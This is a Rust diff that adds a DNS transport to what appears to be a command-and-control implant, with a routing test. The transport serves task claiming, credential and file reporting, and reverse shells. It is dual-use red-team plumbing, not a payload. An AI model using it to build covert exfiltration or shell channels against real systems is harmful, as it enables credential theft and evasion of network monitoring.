@@ -13,8 +13,6 @@ mod http;
 
 #[cfg(feature = "dns")]
 mod dns;
-#[cfg(feature = "dns")]
-pub use dns::DNS as ActiveTransport;
 
 #[cfg(feature = "mock")]
 mod mock;
@@ -30,6 +28,8 @@ pub enum ActiveTransport {
     Grpc(grpc::GRPC),
     #[cfg(feature = "http1")]
     Http(http::HTTP),
+    #[cfg(feature = "dns")]
+    Dns(dns::DNS),
     #[cfg(feature = "mock")]
     Mock(mock::MockTransport),
     Empty,
@@ -76,6 +76,16 @@ impl Transport for ActiveTransport {
                 return Err(anyhow!("http1 transport not enabled"));
             }
 
+            // 4. DNS
+            s if s.starts_with("dns://") => {
+                #[cfg(feature = "dns")]
+                {
+                    Ok(ActiveTransport::Dns(dns::DNS::new(s, proxy_uri)?))
+                }
+                #[cfg(not(feature = "dns"))]
+                return Err(anyhow!("DNS transport not enabled"));
+            }
+
             _ => Err(anyhow!("Could not determine transport from URI: {}", uri)),
         }
     }
@@ -86,6 +96,8 @@ impl Transport for ActiveTransport {
             Self::Grpc(t) => t.claim_tasks(request).await,
             #[cfg(feature = "http1")]
             Self::Http(t) => t.claim_tasks(request).await,
+            #[cfg(feature = "dns")]
+            Self::Dns(t) => t.claim_tasks(request).await,
             #[cfg(feature = "mock")]
             Self::Mock(t) => t.claim_tasks(request).await,
             Self::Empty => Err(anyhow!("Transport not initialized")),
@@ -102,6 +114,8 @@ impl Transport for ActiveTransport {
             Self::Grpc(t) => t.fetch_asset(request, sender).await,
             #[cfg(feature = "http1")]
             Self::Http(t) => t.fetch_asset(request, sender).await,
+            #[cfg(feature = "dns")]
+            Self::Dns(t) => t.fetch_asset(request, sender).await,
             #[cfg(feature = "mock")]
             Self::Mock(t) => t.fetch_asset(request, sender).await,
             Self::Empty => Err(anyhow!("Transport not initialized")),
@@ -117,6 +131,8 @@ impl Transport for ActiveTransport {
             Self::Grpc(t) => t.report_credential(request).await,
             #[cfg(feature = "http1")]
             Self::Http(t) => t.report_credential(request).await,
+            #[cfg(feature = "dns")]
+            Self::Dns(t) => t.report_credential(request).await,
             #[cfg(feature = "mock")]
             Self::Mock(t) => t.report_credential(request).await,
             Self::Empty => Err(anyhow!("Transport not initialized")),
@@ -132,6 +148,8 @@ impl Transport for ActiveTransport {
             Self::Grpc(t) => t.report_file(request).await,
             #[cfg(feature = "http1")]
             Self::Http(t) => t.report_file(request).await,
+            #[cfg(feature = "dns")]
+            Self::Dns(t) => t.report_file(request).await,
             #[cfg(feature = "mock")]
             Self::Mock(t) => t.report_file(request).await,
             Self::Empty => Err(anyhow!("Transport not initialized")),
@@ -147,6 +165,8 @@ impl Transport for ActiveTransport {
             Self::Grpc(t) => t.report_process_list(request).await,
             #[cfg(feature = "http1")]
             Self::Http(t) => t.report_process_list(request).await,
+            #[cfg(feature = "dns")]
+            Self::Dns(t) => t.report_process_list(request).await,
             #[cfg(feature = "mock")]
             Self::Mock(t) => t.report_process_list(request).await,
             Self::Empty => Err(anyhow!("Transport not initialized")),
@@ -162,6 +182,8 @@ impl Transport for ActiveTransport {
             Self::Grpc(t) => t.report_task_output(request).await,
             #[cfg(feature = "http1")]
             Self::Http(t) => t.report_task_output(request).await,
+            #[cfg(feature = "dns")]
+            Self::Dns(t) => t.report_task_output(request).await,
             #[cfg(feature = "mock")]
             Self::Mock(t) => t.report_task_output(request).await,
             Self::Empty => Err(anyhow!("Transport not initialized")),
@@ -178,6 +200,8 @@ impl Transport for ActiveTransport {
             Self::Grpc(t) => t.reverse_shell(rx, tx).await,
             #[cfg(feature = "http1")]
             Self::Http(t) => t.reverse_shell(rx, tx).await,
+            #[cfg(feature = "dns")]
+            Self::Dns(t) => t.reverse_shell(rx, tx).await,
             #[cfg(feature = "mock")]
             Self::Mock(t) => t.reverse_shell(rx, tx).await,
             Self::Empty => Err(anyhow!("Transport not initialized")),
@@ -190,6 +214,8 @@ impl Transport for ActiveTransport {
             Self::Grpc(t) => t.get_type(),
             #[cfg(feature = "http1")]
             Self::Http(t) => t.get_type(),
+            #[cfg(feature = "dns")]
+            Self::Dns(t) => t.get_type(),
             #[cfg(feature = "mock")]
             Self::Mock(t) => t.get_type(),
             Self::Empty => beacon::Transport::Unspecified,
@@ -202,6 +228,8 @@ impl Transport for ActiveTransport {
             Self::Grpc(t) => t.is_active(),
             #[cfg(feature = "http1")]
             Self::Http(t) => t.is_active(),
+            #[cfg(feature = "dns")]
+            Self::Dns(t) => t.is_active(),
             #[cfg(feature = "mock")]
             Self::Mock(t) => t.is_active(),
             Self::Empty => false,
@@ -214,6 +242,8 @@ impl Transport for ActiveTransport {
             Self::Grpc(t) => t.name(),
             #[cfg(feature = "http1")]
             Self::Http(t) => t.name(),
+            #[cfg(feature = "dns")]
+            Self::Dns(t) => t.name(),
             #[cfg(feature = "mock")]
             Self::Mock(t) => t.name(),
             Self::Empty => "none",
@@ -227,6 +257,8 @@ impl Transport for ActiveTransport {
         list.push("grpc".to_string());
         #[cfg(feature = "http1")]
         list.push("http".to_string());
+        #[cfg(feature = "dns")]
+        list.push("dns".to_string());
         #[cfg(feature = "mock")]
         list.push("mock".to_string());
         list
@@ -274,6 +306,27 @@ mod tests {
             assert!(
                 matches!(result, Ok(ActiveTransport::Http(_))),
                 "URI '{}' did not resolve to ActiveTransport::Http",
+                uri
+            );
+        }
+    }
+
+    #[tokio::test]
+    #[cfg(feature = "dns")]
+    async fn test_routes_to_dns_transport() {
+        // DNS URIs should result in the Dns variant
+        let inputs = vec![
+            "dns://8.8.8.8:53?domain=example.com",
+            "dns://*?domain=example.com&type=txt",
+            "dns://1.1.1.1?domain=test.com&type=a",
+        ];
+
+        for uri in inputs {
+            let result = ActiveTransport::new(uri.to_string(), None);
+
+            assert!(
+                matches!(result, Ok(ActiveTransport::Dns(_))),
+                "URI '{}' did not resolve to ActiveTransport::Dns",
                 uri
             );
         }
